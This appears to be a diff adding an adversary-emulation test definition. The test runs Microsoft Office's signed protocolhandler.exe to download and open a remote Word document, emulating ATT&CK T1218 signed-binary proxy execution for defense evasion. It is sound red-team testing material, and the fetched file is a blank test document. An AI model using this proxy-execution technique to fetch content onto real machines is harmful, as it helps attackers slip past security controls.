@@ -1,0 +1,18 @@
+- description: 'Emulates attack via documents through protocol handler in Microsoft
+    Office.  On successful execution you should see Microsoft Word launch a blank
+    file.
+
+    '
+  id: d73f65c91e5b6707a24d2700712dadda
+  name: ProtocolHandler.exe Downloaded a Suspicious File
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: '"C:\Program Files\Microsoft Office\Office16\protocolhandler.exe"
+          "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"'
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: Signed Binary Proxy Execution
